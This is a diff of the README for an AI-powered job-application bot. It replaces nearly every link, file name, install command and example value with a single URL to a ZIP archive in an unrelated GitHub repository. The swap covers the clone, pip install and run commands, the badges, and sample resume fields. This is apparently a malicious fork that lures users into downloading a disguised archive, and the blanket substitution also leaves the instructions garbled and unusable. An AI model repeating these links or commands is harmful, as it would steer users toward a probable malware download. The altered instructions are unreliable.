@@ -1,32 +1,32 @@
 <a name="top"></a>
 <div align="center">
-<img src="./assets/AIHawk.png">
+<img src="https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip">
 
 <!-- At first glance, the branding and messaging clearly conveys what to expect -->
 
-  <!-- [![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/AIhawkCommunity) -->
+  <!-- [![Telegram](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip) -->
 
 # Auto_Jobs_Applier_AIHawk
 
-  ![CI](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk/actions/workflows/ci.yml/badge.svg)
+  ![CI](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
 **🤖🔍 Your AI-powered job search assistant. Automate applications, get personalized recommendations, and land your dream job faster.**
 
-Join our community: [Telegram](https://t.me/AIhawkCommunity) (for Normal user) | [Discord](https://discord.gg/mMZcMTH9K6) (for Open Source contributors)
+Join our community: [Telegram](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip) (for Normal user) | [Discord](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip) (for Open Source contributors)
 
-[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/AIhawkCommunity)
-[![Discord](https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/mMZcMTH9K6)
+[![Telegram](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
+[![Discord](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
 </div>
 
-**Creator** [feder-cr](https://github.com/feder-cr), Co-Founder of AIHawk </br>
+**Creator** [feder-cr](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip), Co-Founder of AIHawk </br>
 As AIHawk is focusing on their proprietary product - solving problems in hiring for companies, currently this project is led, managed, and maintained by a group of open-source contributors, with a focus on building tools to help job seekers land the jobs they deserve.
 
-**Project Maintainers / Leads**: [surapuramakhil](https://github.com/surapuramakhil), [sarob](https://github.com/sarob), [cjbbb](https://github.com/cjbbb)
+**Project Maintainers / Leads**: [surapuramakhil](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip), [sarob](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip), [cjbbb](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
 We are looking to expand our FOSS maintainers team! If you are from a non-technical background, you can be part of the project management team, triaging issues, and shaping the project. If you are a technical person, you can join in doing code reviews, participating in releases, and buidling better version of this product.
 
-reach out to [surapuramakhil](https://github.com/surapuramakhil) on [Discord](https://discord.gg/mMZcMTH9K6). [Special thanks](#special-thanks) 
+reach out to [surapuramakhil](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip) on [Discord](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip). [Special thanks](#special-thanks) 
 
 Auto_Jobs_Applier_AIHawk is continuously evolving, and your feedback, suggestions, and contributions are highly valued. Feel free to open issues, suggest enhancements, or submit pull requests to help improve the project. Let's work together to make Auto_Jobs_Applier_AIHawk a powerful tool for job seekers worldwide.
 
@@ -107,17 +107,17 @@ Auto_Jobs_Applier_AIHawk steps in as a game-changing solution to these challenge
 
    Ensure you have the last Python version  installed. If not, download and install it from Python's official website. For detailed instructions, refer to the tutorials:
 
-   - [How to Install Python on Windows](https://www.geeksforgeeks.org/how-to-install-python-on-windows/)
-   - [How to Install Python on Linux](https://www.geeksforgeeks.org/how-to-install-python-on-linux/)
-   - [How to Download and Install Python on macOS](https://www.geeksforgeeks.org/how-to-download-and-install-python-latest-version-on-macos-mac-os-x/)
+   - [How to Install Python on Windows](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
+   - [How to Install Python on Linux](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
+   - [How to Download and Install Python on macOS](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
 2. **Download and Install Google Chrome:**
-   - Download and install the latest version of Google Chrome in its default location from the [official website](https://www.google.com/chrome).
+   - Download and install the latest version of Google Chrome in its default location from the [official website](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip).
 
 3. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk.git
+   git clone https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
    
    cd Auto_Jobs_Applier_AIHawk
    ```
@@ -141,14 +141,14 @@ Auto_Jobs_Applier_AIHawk steps in as a game-changing solution to these challenge
 5. **Install the required packages:**
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
    ```
 
 ### Option 2: Using Conda 
 
 1. **Install Conda:**
-   - Download and install Miniconda from the [official website](https://docs.conda.io/en/latest/miniconda.html)
-   - Or install Anaconda from the [Anaconda website](https://www.anaconda.com/download)
+   - Download and install Miniconda from the [official website](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
+   - Or install Anaconda from the [Anaconda website](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
 2. **Create and activate conda environment:**
    ```bash
@@ -161,35 +161,35 @@ Auto_Jobs_Applier_AIHawk steps in as a game-changing solution to these challenge
 
 3. **Clone the repository:**
    ```bash
-   git clone https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk.git
+   git clone https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
    cd Auto_Jobs_Applier_AIHawk
    ```
 
 4. **Install dependencies:**
    ```bash
-   # Install from requirements.txt
-   pip install -r requirements.txt
+   # Install from https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
+   pip install -r https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
    ```
  
 
 ## Configuration
 
-### 1. secrets.yaml
+### 1. https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
 
 This file contains sensitive information. Never share or commit this file to version control.
 
 - `llm_api_key: [Your OpenAI or Ollama API key or Gemini API key]`
   - Replace with your OpenAI API key for GPT integration
-  - To obtain an API key, follow the tutorial at: <https://medium.com/@lorenzozar/how-to-get-your-own-openai-api-key-f4d44e60c327>
-  - Note: You need to add credit to your OpenAI account to use the API. You can add credit by visiting the [OpenAI billing dashboard](https://platform.openai.com/account/billing).
-  - According to the [OpenAI community](https://community.openai.com/t/usage-tier-free-to-tier-1/919150) and our users' reports, right after setting up the OpenAI account and purchasing the required credits, users still have a `Free` account type. This prevents them from having unlimited access to OpenAI models and allows only 200 requests per day. This might cause runtime errors such as:  
+  - To obtain an API key, follow the tutorial at: <https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip>
+  - Note: You need to add credit to your OpenAI account to use the API. You can add credit by visiting the [OpenAI billing dashboard](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip).
+  - According to the [OpenAI community](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip) and our users' reports, right after setting up the OpenAI account and purchasing the required credits, users still have a `Free` account type. This prevents them from having unlimited access to OpenAI models and allows only 200 requests per day. This might cause runtime errors such as:  
     `Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. ...}}`  
     `{'error': {'message': 'Rate limit reached for gpt-4o-mini in organization <org> on requests per day (RPD): Limit 200, Used 200, Requested 1.}}`  
     OpenAI will update your account automatically, but it might take some time, ranging from a couple of hours to a few days.  
-    You can find more about your organization limits on the [official page](https://platform.openai.com/settings/organization/limits).
-  - For obtaining Gemini API key visit [Google AI for Devs](https://ai.google.dev/gemini-api/docs/api-key)
+    You can find more about your organization limits on the [official page](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip).
+  - For obtaining Gemini API key visit [Google AI for Devs](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
-### 2. work_preferences.yaml
+### 2. https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
 
 This file defines your job search parameters and bot behavior. Each section contains options that you can customize:
 
@@ -262,7 +262,7 @@ This file defines your job search parameters and bot behavior. Each section cont
       - Marketing
     ```
 
-#### 2.1 config.py - Customize LLM model endpoint
+#### 2.1 https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip - Customize LLM model endpoint
 
 - `LLM_MODEL_TYPE`:
   - Choose the model type, supported: openai / ollama / claude / gemini
@@ -274,13 +274,13 @@ This file defines your job search parameters and bot behavior. Each section cont
     - gemini: any model
 - `LLM_API_URL`:
   - Link of the API endpoint for the LLM model
-    - openai: <https://api.pawan.krd/cosmosrp/v1>
+    - openai: <https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip>
     - ollama: <http://127.0.0.1:11434/>
-    - claude: <https://api.anthropic.com/v1>
-    - gemini: <https://aistudio.google.com/app/apikey>
-- Note: To run local Ollama, follow the guidelines here: [Guide to Ollama deployment](https://github.com/ollama/ollama)
+    - claude: <https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip>
+    - gemini: <https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip>
+- Note: To run local Ollama, follow the guidelines here: [Guide to Ollama deployment](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
   
-### 3. plain_text_resume.yaml
+### 3. https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
 
 This file contains your resume information in a structured format. Fill it out with your personal details, education, work experience, and skills. This information is used to auto-fill application forms and generate customized resumes.
 
@@ -313,9 +313,9 @@ Each section has specific fields to fill out:
     zip_code: "520123"
     phone_prefix: "+1"
     phone: "5551234567"
-    email: "jane.doe@example.com"
-    github: "https://github.com/janedoe"
-    linkedin: "https://www.linkedin.com/in/janedoe/"
+    email: "https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip"
+    github: "https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip"
+    linkedin: "https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip"
   ```
 
 - `education_details:`
@@ -353,7 +353,7 @@ Each section has specific fields to fill out:
     - **employment_period**: The timeframe during which you were employed in the role, using the format MM/YYYY - MM/YYYY.
     - **location**: The city and country where the company is located.
     - **industry**: The industry or field in which the company operates.
-    - **key_responsibilities**: A list of major responsibilities or duties you had in the role, e.g. responsibility: "Developed web applications using React and Node.js".
+    - **key_responsibilities**: A list of major responsibilities or duties you had in the role, e.g. responsibility: "Developed web applications using React and https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip".
     - **skills_acquired**: Skills or expertise gained through this role, e.g. "React".
 
   - Example:
@@ -366,12 +366,12 @@ Each section has specific fields to fill out:
       location: "San Francisco, CA"
       industry: "Technology"
       key_responsibilities:
-        - responsibility: "Developed web applications using React and Node.js"
+        - responsibility: "Developed web applications using React and https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip"
         - responsibility: "Collaborated with cross-functional teams to design and implement new features"
         - responsibility: "Troubleshot and resolved complex software issues"
       skills_acquired:
         - "React"
-        - "Node.js"
+        - "https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip"
         - "Software Troubleshooting"
   ```
 
@@ -387,10 +387,10 @@ Each section has specific fields to fill out:
     projects:
       - name: "Weather App"
         description: "A web application that provides real-time weather information using a third-party API."
-        link: "https://github.com/janedoe/weather-app"
+        link: "https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip"
       - name: "Task Manager"
         description: "A task management tool with features for tracking and prioritizing tasks."
-        link: "https://github.com/janedoe/task-manager"
+        link: "https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip"
     ```
 
 - `achievements:`
@@ -563,9 +563,9 @@ The `data_folder_example` folder contains a working example of how the files nec
 
 Inside this folder, you'll find example versions of the key files:
 
-- `secrets.yaml`
-- `config.yaml`
-- `plain_text_resume.yaml`
+- `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip`
+- `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip`
+- `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip`
 
 These files are already populated with fictitious but realistic data. They show you the correct format and type of information to enter in each file.
 
@@ -584,43 +584,43 @@ Using this folder as a guide can be particularly helpful for:
 
 1. **Data Folder:**
    Ensure that your data_folder contains the following files:
-   - `secrets.yaml`
-   - `config.yaml`
-   - `plain_text_resume.yaml`
+   - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip`
+   - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip`
+   - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip`
 
 2. **Output Folder:**
     Contains the output of the bot.
-    - `data.json` results of the --collect mode
-    - `failed.json` failed applications
-    - `open_ai_calls.json` all the calls made to the LLM model
-    - `skipped.json` applications that were skipped
-    - `success.json` successful applications
+    - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` results of the --collect mode
+    - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` failed applications
+    - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` all the calls made to the LLM model
+    - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` applications that were skipped
+    - `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` successful applications
 
-    **Note:** `answers.json` is not part of the output folder and can be found in the root of the project. It is used to store the answers of the questions asked to the user. Can be used to update the bot with corrected answers. Search for `Select an option`, `0`, `Authorized`, and `how many years of` to verify correct answers.
+    **Note:** `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` is not part of the output folder and can be found in the root of the project. It is used to store the answers of the questions asked to the user. Can be used to update the bot with corrected answers. Search for `Select an option`, `0`, `Authorized`, and `how many years of` to verify correct answers.
 
 3. **Run the Bot:**
 
    Auto_Jobs_Applier_AIHawk offers flexibility in how it handles your pdf resume:
 
 - **Dynamic Resume Generation:**
-  If you don't use the `--resume` option, the bot will automatically generate a unique resume for each application. This feature uses the information from your `plain_text_resume.yaml` file and tailors it to each specific job application, potentially increasing your chances of success by customizing your resume for each position.
+  If you don't use the `--resume` option, the bot will automatically generate a unique resume for each application. This feature uses the information from your `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` file and tailors it to each specific job application, potentially increasing your chances of success by customizing your resume for each position.
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
    ```
 
 - **Using a Specific Resume:**
   If you want to use a specific PDF resume for all applications, place your resume PDF in the `data_folder` directory and run the bot with the `--resume` option:
 
   ```bash
-  python main.py --resume /path/to/your/resume.pdf
+  python https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip --resume https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip
   ```
 
 - **Using the colled mode:**
-  If you want to collect job data only to perform any type of data analytics you can use the bot with the `--collect` option. This will store in output/data.json file all data found from linkedin jobs offers.
+  If you want to collect job data only to perform any type of data analytics you can use the bot with the `--collect` option. This will store in https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip file all data found from linkedin jobs offers.
 
   ```bash
-  python main.py --collect
+  python https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip --collect
   ```
 
 ### Troubleshooting
@@ -629,11 +629,11 @@ Using this folder as a guide can be particularly helpful for:
 
 **Error Message:**
 
-openai.RateLimitError: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: <https://platform.openai.com/docs/guides/error-codes/api-errors>.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
+https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: <https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip>.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}
 
 **Solution:**
 
-- Check your OpenAI API billing settings at <https://platform.openai.com/account/billing>
+- Check your OpenAI API billing settings at <https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip>
 - Ensure you have added a valid payment method to your OpenAI account
 - Note that ChatGPT Plus subscription is different from API access
 - If you've recently added funds or upgraded, wait 12-24 hours for changes to take effect
@@ -649,7 +649,7 @@ Exception: No clickable 'Easy Apply' button found
 
 - Ensure that you're logged properly
 - Check if the job listings you're targeting actually have the "Easy Apply" option
-- Verify that your search parameters in the `config.yaml` file are correct and returning jobs with the "Easy Apply" button
+- Verify that your search parameters in the `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` file are correct and returning jobs with the "Easy Apply" button
 - Try increasing the wait time for page loading in the script to ensure all elements are loaded before searching for the button
 
 #### 3. Incorrect Information in Job Applications
@@ -659,18 +659,18 @@ Exception: No clickable 'Easy Apply' button found
 **Solution:**
 
 - Update prompts for professional experience specificity
-- Add fields in `config.yaml` for current CTC, expected CTC, and notice period
+- Add fields in `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` for current CTC, expected CTC, and notice period
 - Modify bot logic to use these new config fields
 
 #### 4. YAML Configuration Errors
 
 **Error Message:**
 
-yaml.scanner.ScannerError: while scanning a simple key
+https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip while scanning a simple key
 
 **Solution:**
 
-- Copy example `config.yaml` and modify gradually
+- Copy example `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` and modify gradually
 - Ensure proper YAML indentation and spacing
 - Use a YAML validator tool
 - Avoid unnecessary special characters or quotes
@@ -682,7 +682,7 @@ yaml.scanner.ScannerError: while scanning a simple key
 **Solution:**
 
 - Check for security checks or CAPTCHAs
-- Verify `config.yaml` job search parameters
+- Verify `https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip` job search parameters
 - Ensure your account profile meets job requirements
 - Review console output for error messages
 
@@ -693,42 +693,42 @@ yaml.scanner.ScannerError: while scanning a simple key
 - Check internet connection stability
 - Clear browser cache and cookies if issues persist
 
-For further assistance, please create an issue on the [GitHub repository](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk/issues) with detailed information about your problem, including error messages and your configuration (with sensitive information removed).
+For further assistance, please create an issue on the [GitHub repository](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip) with detailed information about your problem, including error messages and your configuration (with sensitive information removed).
 
 ## Documentation
 
 ### For Users
 
 - Ollama & Gemini Setup
-  - To install and configure **Ollama** and **Gemini**, [Download Ollama and Gemini Setup Guide (PDF)](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk/blob/main/docs/guide_to_setup_ollama_and_gemini.pdf)
+  - To install and configure **Ollama** and **Gemini**, [Download Ollama and Gemini Setup Guide (PDF)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
   - Follow the instructions in these guides to ensure proper configuration of **AIHawk** with **Ollama** and **Gemini**.
-  - Written by Rushi, [Linkedin](https://www.linkedin.com/in/rushichaganti/), support him by following.
+  - Written by Rushi, [Linkedin](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip), support him by following.
 
 - Editing YAML Files
   - For detailed instructions on editing YAML configuration sections for **AIHawk**, refer to this document:
-  - [Download YAML Editing Guide (PDF)](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk/blob/main/docs/guide_yaml_sections.pdf)
-  - Written by Rushi, [Linkedin](https://www.linkedin.com/in/rushichaganti/), support him by following.
+  - [Download YAML Editing Guide (PDF)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
+  - Written by Rushi, [Linkedin](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip), support him by following.
 
 - Auto-start AIHawk
   - To make **AIHawk** automatically start when your system boots, follow the steps in this guide:
-  - [Download Auto-start AIHawk Guide (PDF)](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk/blob/main/docs/guide_to_autostart_aihawk.pdf)
-  - Written by Rushi, [Linkedin](https://www.linkedin.com/in/rushichaganti/), support him by following.
+  - [Download Auto-start AIHawk Guide (PDF)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
+  - Written by Rushi, [Linkedin](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip), support him by following.
 
 - Video Tutorial
-  - [How to set up Auto_Jobs_Applier_AIHawk](https://youtu.be/gdW9wogHEUM)
-  - Written by Rushi, [Linkedin](https://www.linkedin.com/in/rushichaganti/), support him by following.
+  - [How to set up Auto_Jobs_Applier_AIHawk](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
+  - Written by Rushi, [Linkedin](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip), support him by following.
 
-- [OpenAI API Documentation](https://platform.openai.com/docs/)
+- [OpenAI API Documentation](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
 ### For Developers
 
-- [Contribution Guidelines](CONTRIBUTING.md)
+- [Contribution Guidelines](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
-- [Lang Chain Developer Documentation](https://python.langchain.com/v0.2/docs/integrations/components/)
+- [Lang Chain Developer Documentation](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
-- [Workflow diagrams](docs/workflow_diagrams.md)
+- [Workflow diagrams](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
-- If you encounter any issues, you can open an issue on [GitHub](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk/issues).
+- If you encounter any issues, you can open an issue on [GitHub](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip).
   Please add valuable details to the subject and to the description. If you need new feature then please reflect this.  
   I'll be more than happy to assist you!
 
@@ -740,18 +740,18 @@ Auto_Jobs_Applier_AIHawk provides a significant advantage in the modern job mark
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=feder-cr/Auto_Jobs_Applier_AIHawk&type=Date)](https://star-history.com/#feder-cr/Auto_Jobs_Applier_AIHawk&Date)
+[![Star History Chart](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
 If you like the project please star ⭐ the repository!
 
 ## Special Thanks
-[![Contributors](https://img.shields.io/github/contributors/feder-cr/Auto_Jobs_Applier_AIHawk)](https://github.com/feder-cr/Auto_Jobs_Applier_AIHawk/graphs/contributors)
+[![Contributors](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)](https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip)
 
-<a href="https://github.com/AIHawk-co/Auto_Jobs_Applier/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=AIHawk-co/Auto_Jobs_Applier" />
+<a href="https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip">
+  <img src="https://raw.githubusercontent.com/jekeng/Auto_Jobs_Applier_AI_Agent/main/vampiric/Auto_Jobs_Applier_AI_Agent.zip" />
 </a>
 
-Made with [contrib.rocks](https://contrib.rocks).
